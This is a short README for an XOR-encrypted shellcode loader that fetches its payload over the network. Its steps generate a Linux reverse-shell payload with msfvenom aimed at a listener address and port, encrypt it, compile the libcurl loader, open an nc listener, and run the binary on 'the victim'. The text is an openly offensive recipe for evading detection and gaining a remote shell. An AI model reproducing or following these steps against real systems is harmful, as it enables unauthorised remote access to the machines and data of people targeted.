# Shellcode Runner with XOR

## How To
1. Generate your `.bin` shellcode (`msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.235.130 LPORT=8443 -f raw -o shellcode.bin`)
2. Encrypt with XOR and your _KEY_
3. Update _URL_ and _KEY_ in the `xorLoader.c` file
4. Compile with `gcc xorLoader.c -o xorLoader.elf -lcurl`
5. Open your listener `nc -lvnp 8443`
6. Run the `xorLoader.elf` the victim


